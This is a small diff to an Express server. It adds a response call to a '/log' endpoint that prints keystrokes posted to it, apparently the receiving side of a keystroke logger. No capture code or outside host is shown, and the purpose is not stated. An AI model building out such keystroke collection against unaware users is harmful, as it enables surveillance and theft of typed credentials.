@@ -9,6 +9,7 @@ app.use(express.json());
 // logging endpoint
 app.post("/log", (req, res) => {
   console.log("Keystroke logged:", req.body.key);
+  res.send();
 });
 
 const PORT = 2000;
